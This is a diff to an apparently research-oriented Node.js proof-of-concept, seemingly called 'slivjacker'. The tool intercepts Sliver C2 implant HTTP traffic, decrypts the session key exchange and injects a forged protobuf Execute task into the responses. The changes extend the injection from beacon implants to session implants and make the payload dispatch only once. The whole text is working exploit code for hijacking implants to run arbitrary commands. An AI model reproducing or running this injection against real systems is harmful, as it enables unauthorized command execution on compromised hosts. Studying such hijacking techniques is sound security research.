@@ -70,6 +70,9 @@ function intercept(conf, req, resp)
       let decoded = encoder.decode(data);
       if(url.pathname.endsWith('.html')) // Key exchange
       {
+        // New session! Reset the dispatched status.
+        module.taskDispatched = false;
+
         let parsed = decryptSessionKey(conf, decoded);
         console.log('Decoded:', parsed);
 
@@ -126,7 +129,7 @@ function intercept(conf, req, resp)
         resp.end();
       }
     }
-    else
+    else // Assume it's a 'GET'
     {
       if(url.pathname.endsWith('.png')) // Close session
       {
@@ -139,7 +142,8 @@ function intercept(conf, req, resp)
       }
 
       // Juicy payload injection starts here. c:
-      let spear = encodePayload(conf);
+      //  We'll only run it once.
+      let spear = module.taskDispatched ? null : encodePayload(conf);
       if(!spear) // Encoding error
       {
         resp.writeHead(202, {
@@ -149,6 +153,7 @@ function intercept(conf, req, resp)
 
         return;
       }
+      module.taskDispatched = true;
 
       let iv = Buffer.allocUnsafe(12);
       crypto.randomFillSync(iv);
@@ -199,21 +204,36 @@ function decodeMessage(conf, buf)
 {
   let rawBundle = conf.pbRoot.lookupType('Envelope').decode(buf);
   let ret = null;
-  switch(rawBundle.Type)
+  if(rawBundle.UnknownMessageType)
   {
-    case 93: // BeaconRegister
+    ret = {
+      error: true,
+      id: rawBundle.ID
+    };
+  }
+  else
+  {
+    switch(rawBundle.Type)
     {
-      ret = conf.pbRoot.lookupType('BeaconRegister').decode(buf);
-      break;
-    }
-    case 94: // BeaconTasks report
-    {
-      ret = conf.pbRoot.lookupType('BeaconTasksJS').decode(buf);
-      break;
-    }
-    default:
-    {
-      // Do nothing for now
+      case 1: // Register (used for session implants)
+      {
+        ret = conf.pbRoot.lookupType('Register').decode(rawBundle.Data);
+        break;
+      }
+      case 93: // BeaconRegister
+      {
+        ret = conf.pbRoot.lookupType('BeaconRegister').decode(rawBundle.Data);
+        break;
+      }
+      case 94: // BeaconTasks report
+      {
+        ret = conf.pbRoot.lookupType('BeaconTasksJS').decode(rawBundle.Data);
+        break;
+      }
+      default:
+      {
+        ret = rawBundle;
+      }
     }
   }
 
@@ -227,26 +247,50 @@ function encodePayload(conf)
     let execReq = conf.pbRoot.lookupType('ExecuteReq');
     let dat0 = execReq.encode(conf.payload).finish();
     // console.log(dat0);
-  
-    let beaconTasks = conf.pbRoot.lookupType('BeaconTasks');
-    let dat1 = beaconTasks.encode({
-      ID: 'slivjacker', // Whatever random stuff
-      Tasks: [{
-        ID: 0x78563412, // Whatever random stuff again
-        Type: 44, // taskTypes.Execute
-        Data: dat0
-      }]
-    }).finish();
-    // console.log(dat1);
-  
-    let envelope = conf.pbRoot.lookupType('Envelope');
-    let dat2 = envelope.encode({
-      ID: 0x21436587, // Again what it is doesn't matter here
-      Data: dat1
-    }).finish();
-    // console.log(dat2);
-  
-    return dat2;
+
+    switch(conf.type.toLowerCase())
+    {
+      case "beacon":
+      {
+        let beaconTasks = conf.pbRoot.lookupType('BeaconTasks');
+        let dat1 = beaconTasks.encode({
+          ID: 'slivjacker', // Whatever random stuff
+          Tasks: [{
+            ID: 0x78563412, // Whatever random stuff again
+            Type: 44, // taskTypes.Execute
+            Data: dat0
+          }]
+        }).finish();
+        // console.log(dat1);
+      
+        let envelope = conf.pbRoot.lookupType('Envelope');
+        let dat2 = envelope.encode({
+          ID: 0x21436587, // Again what it is doesn't matter here
+          Data: dat1
+        }).finish();
+        // console.log(dat2);
+      
+        return dat2;
+      }
+      case "session":
+      {
+        let envelope = conf.pbRoot.lookupType('Envelope');
+        let dat2 = envelope.encode({
+          Type: 44, // taskTypes.Execute
+          ID: 0x21436587,
+          Data: dat0
+        }).finish();
+        // console.log(dat2.toString('hex'));
+    
+        return dat2;
+      }
+      default:
+      {
+        console.error("ERROR! Unrecognized implant type: %s", conf.type);
+
+        return null;
+      }
+    }
   }
   catch(err)
   {
@@ -260,6 +304,9 @@ function encodePayload(conf)
 function __main__()
 {
   let conf = JSON.parse(fs.readFileSync(`${__dirname}/../conf.json`));
+
+  // We'll only run the payload once instead of spamming the PoC VM to death.
+  module.taskDispatched = false;
 
   protobuf.load(`${__dirname}/../data/protobuf/sliver.proto`, function(err0, pbRoot) {
     if(err0)
